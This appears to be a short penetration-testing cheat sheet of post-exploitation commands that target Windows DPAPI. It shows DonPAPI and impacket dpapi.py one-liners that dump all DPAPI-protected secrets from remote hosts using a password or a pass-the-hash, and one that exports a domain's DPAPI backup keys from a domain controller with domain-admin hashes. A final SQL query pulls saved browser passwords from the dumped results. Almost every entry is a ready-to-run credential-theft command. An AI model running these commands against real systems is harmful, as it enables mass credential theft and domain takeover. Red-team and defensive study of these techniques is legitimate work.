# DPAPI

% dpapi, windows, donpapi

## DonPAPI - Dump all - pwd
#plateform/linux #target/remote #cat/POSTEXPLOIT
```
donpapi <domain>/<user>:<password>@<target> -o donpapi_res
```

## DonPAPI - Dump all - hashes
#plateform/linux #target/remote #cat/POSTEXPLOIT
```
donpapi <domain>/<user>@<target> -o donpapi_res --hashes '<hashes>'
```

## Get Domain BackupKeys
#plateform/linux #target/remote #cat/POSTEXPLOIT
```
dpapi.py backupkeys --export -t <domain>/<da_user>@<dc_ip> -hashes '<hashes>'
```

##  DonPAPI - Dump all with backup key

#plateform/linux #target/remote #cat/POSTEXPLOIT
```
donpapi -pvk domain_backupkey.pvk <domain>/<da_user>@<network_file> -o donpapi_res --hashes '<hashes>'
```

## DonPAPI DB - Browser pwd not empty

```
select username, password, target from credz where type like 'browser%' and password IS NOT '' and password is not ' ';
```